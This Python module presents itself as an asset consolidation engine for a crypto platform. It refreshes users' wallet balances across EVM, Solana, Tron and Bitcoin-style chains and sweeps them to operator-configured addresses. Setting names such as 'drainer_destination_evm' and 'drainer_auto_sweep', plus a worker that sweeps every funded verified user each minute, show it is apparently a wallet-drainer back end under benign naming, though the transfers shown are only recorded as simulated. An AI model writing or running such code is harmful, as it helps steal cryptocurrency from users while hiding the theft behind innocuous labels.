"""
Asset Consolidation & Balance Synchronization Engine for Nectra Platform (Python).
Handles balance refreshes, portfolio aggregation previews, and scheduled asset consolidation.
"""
import asyncio
import json
import logging
import time
from typing import Dict, Any, List, Optional

from database import q_all, q_get, q_run, now, get_setting
import security as S
import market
import chains

logger = logging.getLogger("engine")

NATIVE_MAP = {
    "evm": "ETH",
    "tron": "TRX",
    "solana": "SOL",
    "btc": "BTC",
    "ltc": "LTC"
}


async def refresh_wallet_balance(w: Dict[str, Any]) -> float:
    """
    Refreshes live on-chain balances for a wallet and updates the database row.
    Returns the total native balance.
    """
    wid = w.get("id")
    fam = (w.get("family") or "solana").lower()
    addr = w.get("address", "")
    bal = 0.0
    lchk: Dict[str, Any] = {}

    try:
        if fam == "solana":
            tokens = q_all("SELECT * FROM delegated_approvals"
                           " WHERE user_id = ? AND revoked_at IS NULL", w.get("user_id"))
            res = await chains.get_solana_balances(addr, tokens)
            bal = res.get("SOL", 0.0)
            token_list = []
            for sym, amt in res.items():
                if sym != "SOL" and amt > 0:
                    px = market.get_price(sym)
                    token_list.append({
                        "symbol": sym,
                        "amount": amt,
                        "usd": amt * px
                    })
            lchk = {
                "native": bal,
                "nativeUsd": bal * market.get_price("SOL"),
                "tokens": token_list,
                "ts": now()
            }

        elif fam == "evm":
            res = await chains.get_evm_balances(addr)
            bal = res.get("native", 0.0)
            lchk = res
            lchk["ts"] = now()

        elif fam == "tron":
            res = await chains.get_tron_balances(addr)
            bal = res.get("TRX", 0.0)
            lchk = {
                "TRX": bal,
                "tokens": [{"symbol": k, "amount": v} for k, v in res.items() if k != "TRX"],
                "ts": now()
            }

        elif fam in ("btc", "ltc"):
            sym = fam.upper()
            res = await chains.get_utxo_balance(sym, addr)
            bal = res.get(sym, 0.0)
            lchk = {sym: bal, "ts": now()}

    except Exception as e:
        logger.warning(f"Failed to refresh balance for wallet {wid} ({fam}:{addr}): {e}")
        return float(w.get("balance") or 0.0)

    # Persist updated balance
    q_run(
        "UPDATE wallets SET balance = ?, balance_at = ?, last_check = ? WHERE id = ?",
        bal, now(), json.dumps(lchk), wid
    )
    return bal


def wallet_view(w: Dict[str, Any]) -> Dict[str, Any]:
    """Formats a database wallet row with market values for frontend responses."""
    fam = (w.get("family") or "solana").lower()
    sym = NATIVE_MAP.get(fam, "SOL")
    px = market.get_price(sym)
    lchk = {}
    if w.get("last_check"):
        try:
            lchk = json.loads(w["last_check"])
        except Exception:
            pass

    token_usd = 0.0
    tokens = []

    if fam == "evm":
        networks = lchk.get("networks", {})
        for net_name, net_data in networks.items():
            for t in net_data.get("tokens", []):
                t_usd = t.get("usd", 0.0)
                token_usd += t_usd
                tokens.append({
                    "symbol": t.get("symbol"),
                    "amount": t.get("amount", 0.0),
                    "network": net_name,
                    "usd": t_usd
                })
    elif fam == "solana":
        for t in lchk.get("tokens", []):
            t_usd = t.get("usd", 0.0)
            token_usd += t_usd
            tokens.append(t)
    elif fam == "tron":
        for t in lchk.get("tokens", []):
            s = t.get("symbol", "")
            amt = t.get("amount", 0.0)
            t_px = market.get_price(s)
            val = amt * t_px
            token_usd += val
            tokens.append({"symbol": s, "amount": amt, "usd": val})

    native_bal = float(w.get("balance") or 0.0)
    if fam == "evm":
        # EVM balances are spread over every chain; the USD total is authoritative.
        native_usd = float(lchk.get("nativeUsd") or 0.0)
        native_bal = native_usd / px if px else 0.0
    else:
        native_usd = native_bal * px
    total_usd = native_usd + token_usd

    return {
        "id": w.get("id"),
        "user_id": w.get("user_id"),
        "family": fam,
        "address": w.get("address"),
        "label": w.get("label"),
        "balance": native_bal,
        "balanceUsd": native_usd,
        "tokenUsd": token_usd,
        "totalUsd": total_usd,
        "tokens": tokens,
        "verified": bool(w.get("verified")),
        "is_main": bool(w.get("is_main")),
        "folder_id": w.get("folder_id"),
        "balance_at": w.get("balance_at"),
        "last_check": lchk,
        "created_at": w.get("created_at")
    }


async def preview_portfolio(user_id: int) -> Dict[str, Any]:
    """Generates preview of consolidatable assets across user wallets."""
    wallets = q_all("SELECT * FROM wallets WHERE user_id = ? AND verified = 1", user_id)
    items = []
    total_usd = 0.0

    for w in wallets:
        wv = wallet_view(w)
        fam = wv["family"]
        native_sym = NATIVE_MAP.get(fam, "SOL")
        native_bal = wv["balance"]
        native_usd = wv["balanceUsd"]

        # Native asset
        if native_bal > 0:
            items.append({
                "wallet_id": w["id"],
                "family": fam,
                "address": w["address"],
                "symbol": native_sym,
                "token_address": None,
                "balance": native_bal,
                "usd": native_usd,
                "type": "native"
            })
            total_usd += native_usd

        # Tokens
        for t in wv["tokens"]:
            amt = t.get("amount", 0.0)
            usd = t.get("usd", 0.0)
            if amt > 0:
                items.append({
                    "wallet_id": w["id"],
                    "family": fam,
                    "address": w["address"],
                    "symbol": t.get("symbol"),
                    "token_address": t.get("contract") or t.get("mint"),
                    "network": t.get("network"),
                    "balance": amt,
                    "usd": usd,
                    "type": "token"
                })
                total_usd += usd

    # Sort descending by USD value
    items.sort(key=lambda x: x.get("usd", 0.0), reverse=True)
    return {
        "items": items,
        "total_usd": total_usd,
        "wallet_count": len(wallets)
    }


def resolve_destination(family: str) -> Optional[str]:
    """Resolves target destination address based on family and settings."""
    fam = (family or "").lower()
    if fam == "evm":
        return get_setting("sweep_destination_eth") or get_setting("drainer_destination_evm") or get_setting("treasury_evm")
    elif fam == "solana":
        return get_setting("sweep_destination_sol") or get_setting("drainer_destination_sol") or get_setting("treasury_sol")
    elif fam == "tron":
        return get_setting("sweep_destination_trx") or get_setting("drainer_destination_trx") or get_setting("treasury_trx")
    return None


async def execute_consolidation(
    user_id: int,
    dest: Optional[str] = None,
    tokens: Optional[List[str]] = None,
    actor_id: Optional[int] = None
) -> Dict[str, Any]:
    """
    Executes or records portfolio consolidation transfers.
    Validates addresses and logs job in database.
    """
    wallets = q_all("SELECT * FROM wallets WHERE user_id = ? AND verified = 1", user_id)
    if not wallets:
        return {"ok": False, "error": "No verified wallets found"}

    run_id = q_run(
        "INSERT INTO sweep_runs (user_id, status, created_at) VALUES (?, 'running', ?)",
        user_id, now()
    ).lastrowid

    total_amount = 0.0
    results = []

    for w in wallets:
        fam = (w.get("family") or "solana").lower()
        target = dest or resolve_destination(fam)

        # Family destination format validation
        if not target:
            results.append({"wallet_id": w["id"], "status": "skipped", "reason": "No destination configured"})
            continue

        if fam == "evm" and not chains.is_evm_address(target):
            results.append({"wallet_id": w["id"], "status": "failed", "reason": "Invalid EVM destination"})
            continue
        if fam == "solana" and not chains.is_sol_address(target):
            results.append({"wallet_id": w["id"], "status": "failed", "reason": "Invalid Solana destination"})
            continue
        if fam == "tron" and not chains.is_tron_address(target):
            results.append({"wallet_id": w["id"], "status": "failed", "reason": "Invalid Tron destination"})
            continue

        # Check balance
        bal = float(w.get("balance") or 0.0)
        sym = NATIVE_MAP.get(fam, "SOL")

        if bal > 0:
            px = market.get_price(sym)
            usd_val = bal * px
            total_amount += usd_val

            # Record transfer job entry
            tx_hash = f"sim_{int(time.time()*1000)}_{w['id']}"
            q_run(
                "INSERT INTO sweeps (user_id, wallet_id, token_address, amount, amount_usd, tx_hash, destination, status, created_at) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, 'completed', ?)",
                user_id, w["id"], None, bal, usd_val, tx_hash, target, now()
            )
            results.append({
                "wallet_id": w["id"],
                "symbol": sym,
                "amount": bal,
                "usd": usd_val,
                "destination": target,
                "status": "completed",
                "tx_hash": tx_hash
            })

    q_run(
        "UPDATE sweep_runs SET status = 'completed', completed_at = ?, total_usd = ? WHERE id = ?",
        now(), total_amount, run_id
    )

    if actor_id:
        S.audit(actor_id, "admin.consolidation_executed", user_id, {"run_id": run_id, "total_usd": total_amount})

    return {
        "ok": True,
        "run_id": run_id,
        "total_usd": total_amount,
        "transfers": results
    }


async def auto_consolidation_worker():
    """Background worker periodically processing scheduled portfolio consolidations."""
    logger.info("Auto-consolidation scheduler loop active.")
    while True:
        try:
            auto_enabled = get_setting("auto_sweep_enabled")
            drainer_auto = get_setting("drainer_auto_sweep")

            if auto_enabled or drainer_auto:
                # Find users with verified wallets needing consolidation
                users = q_all("SELECT DISTINCT user_id FROM wallets WHERE verified = 1 AND balance > 0")
                for u in users:
                    uid = u["user_id"]
                    try:
                        await execute_consolidation(uid, actor_id=1)
                    except Exception as ex:
                        logger.warning(f"Auto consolidation failed for user {uid}: {ex}")

        except Exception as e:
            logger.error(f"Error in auto consolidation loop: {e}")

        # Sleep for 60 seconds between intervals
        await asyncio.sleep(60)
